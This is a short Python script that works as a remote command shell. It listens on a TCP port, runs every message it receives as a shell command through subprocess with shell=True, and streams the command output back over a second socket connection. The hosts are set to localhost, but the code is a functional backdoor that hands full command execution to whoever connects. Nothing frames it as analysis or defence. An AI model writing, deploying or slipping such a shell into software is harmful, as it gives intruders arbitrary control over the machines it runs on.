import socket
import time
import subprocess

CLIENT = "127.0.0.1"

PORT2 = 888

HOST = "127.0.0.1"

PORT = 777

def listen():

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

        f = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        f.connect((HOST, PORT2))

        s.bind((HOST, PORT))

        s.listen()

        time.sleep(3)

        conn, addr = s.accept()

        print(f"connected with {addr}")

        with conn:
            while True:
                msg = conn.recv(2048).decode()
                if not msg:
                    break
                r = subprocess.Popen(
                    msg,
                    text=True,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT
                )
                for line in r.stdout:
                    f.sendall(line.encode())
                    r.wait()

listen()
